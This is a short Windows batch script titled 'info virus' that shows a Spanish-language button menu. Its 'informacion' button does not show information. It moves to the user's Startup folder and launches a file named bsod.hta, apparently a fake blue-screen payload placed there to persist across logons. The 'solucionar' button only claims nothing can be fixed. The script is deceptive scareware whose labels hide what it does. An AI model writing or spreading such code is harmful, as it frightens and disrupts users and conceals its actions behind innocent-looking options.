@Echo off
@Mode 48,15
Title info virus
Batbox /h 0

:Loop
cls
Call Button  10 4 "solucionar" 24 4 "informacion" 17 8 "  salir  " # Press
Getinput /m %Press% /h 70

:: Check for the pressed button 
if %errorlevel%==1 (goto 99)
if %errorlevel%==2 (goto 999)
if %errorlevel%==3 (exit)
goto Loop

:99
cls
echo Oops
echo.
echo no se puede hacer nada!
echo.
echo ( :
pause>nul
goto Loop

:999
cls
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
start bsod.hta
exit

